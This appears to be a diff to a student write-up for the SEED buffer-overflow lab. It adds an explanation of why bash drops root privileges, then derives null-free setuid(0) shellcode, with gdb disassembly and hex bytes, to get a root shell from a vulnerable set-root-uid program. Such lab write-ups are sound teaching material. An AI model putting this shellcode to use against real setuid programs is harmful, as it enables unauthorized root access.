@@ -16,14 +16,62 @@ Task 2
 After symlinking sh back to bash the same buffer overflow attack successfully
 spawned a new shell, but without root access. Instead the original user
 that spawned the shell, 'seed', remained as both the real user id as well as
-the effective user id. This is because although ./stack has been made to
-set-root-uid, bash drops the effective user id 'root' when it is invoked,
-restoring the real user id 'seed'. To get around this, we tried adding a call
-to setreuid in our shellcode. However, we were unable to get this working.
+the effective user id.
 
+This is because although ./stack has been set to run with the effective uid as
+root, bash checks the real uid and determines that the current uid is still
+'seed' since running an executable with 4755 only sets the effective uid to
+root. Therefore bash assumes that the executable was not supposed to spawn a
+shell as the effective uid but rather as the real uid and spawns the shell as
+'seed'.
+
+In order to truely gain root access we need to call `setuid(0)` to set the real
+uid to root. This is possible when the effective uid is already root as in the
+stack program.
+
+To do this we follow the same process as mentioned in Smashing the Stack for
+fun and profit[^1]. First we have a binary that calls `setuid(0)` and compile it
+`-static` so the `setuid` is included with the executable. We then dissassemble
+the `setuid` function in `gdb` to find the following lines responsible for the
+system call to set the uid.
+
+```
 0x0804e79e <setuid+46>:	mov    0x8(%ebp),%ebx
 0x0804e7a1 <setuid+49>:	mov    $0xd5,%eax
 0x0804e7a6 <setuid+54>:	int    $0x80
+```
+Here we see that `ebx` stores the uid to set, `0xd5` is the system call number
+and then a trap interrupt is sent to invoke the kernel. Translating this into
+assembly to inject we have:
+
+```
+mov $0x0,%ebx  ;
+mov $0xd5,%eax ;
+int $0x80      ;
+```
+
+However there is a problem where the machine code contains `'0x00'` which would
+be interpretted as `NULL` and terminate the buffer overflow inside the `strcpy`.
+
+So the following assembly is used as a substitue:
+
+```
+xor    %ebx,%ebx ; // "mov    $0x0,%ebx; "
+xor    %eax,%eax ; // "mov    $0xd5,%eax; "
+movb   $0xd5,%al ; // "mov    $0xd5,%eax; "
+int    $0x80     ;
+```
+
+This is then disassembled into machine code in gdb using the `x/bx` command and
+the result is inserted before the shellcode to set the uid to root so the shell
+may be spawned as root in bash.
+
+```
+  "\x31\xdb"          /* Line 1:  xorl   %ebx,%ebx   */
+  "\x31\xc0"          /* Line 3:  xorl   %eax,%eax   */
+  "\xb0\xd5"          /* Line 4:  movb   $0xd5,%al   */
+  "\xcd\x80"          /* Line 5:  int    $0x80       */
+```
 
 Task 3
 ======
@@ -75,3 +123,5 @@ make: *** [all] Aborted
 The program crashes and root access is not obtained. This is due to gcc's
 StackGuard preventing basic buffer overflow attacks on the stack's return
 address.
+
+[^1]: http://insecure.org/stf/smashstack.html
